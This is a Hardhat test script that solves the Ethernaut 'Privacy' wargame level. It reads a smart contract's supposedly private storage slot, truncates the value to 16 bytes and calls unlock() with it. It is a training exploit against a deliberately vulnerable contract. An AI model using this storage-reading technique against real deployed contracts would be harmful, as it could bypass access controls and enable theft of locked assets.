const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { keccak256 } = require("ethers/lib/utils");
const { ethers, waffle } = require("hardhat");
const {
  createChallenge,
  submitLevel,
  ETHERNAUT_ABI,
  ETHERNAUT_ADDRESS,
} = require("./utils");

const abi = [
  {
    inputs: [{ internalType: "bytes32[3]", name: "_data", type: "bytes32[3]" }],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "ID",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xb3cea217",
  },
  {
    inputs: [],
    name: "locked",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xcf309012",
  },
  {
    inputs: [{ internalType: "bytes16", name: "_key", type: "bytes16" }],
    name: "unlock",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xe1afb08c",
  },
];

const contractLevel = "0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe";

before(async () => {
  [eoa] = await ethers.getSigners();
  challengeAddress = await createChallenge(contractLevel, 0, "PrivacyFactory");
  //   const artifact = await artifacts.readArtifact("Fal1out");
  challenge = new ethers.Contract(challengeAddress, abi, eoa);
  console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
});

it("solves the challenge", async () => {
  // storage is allocated to slots like this:
  // https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html
  // 0: locked
  // 1: ID
  // 2: flattening, denomination, awkwardness (storage can be packed into a 256 bit slot)
  // 3: data[0] (because **fixed** size array)
  // 4: data[1]
  // 5: data[2]
  let dataSlot5 = await ethers.provider.getStorageAt(challenge.address, 5);
  let bytes16 = await ethers.utils.hexDataSlice(dataSlot5, 0, 16);
  const tx = await challenge.unlock(bytes16, { gasLimit: 30000000 });
  tx.wait(1);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
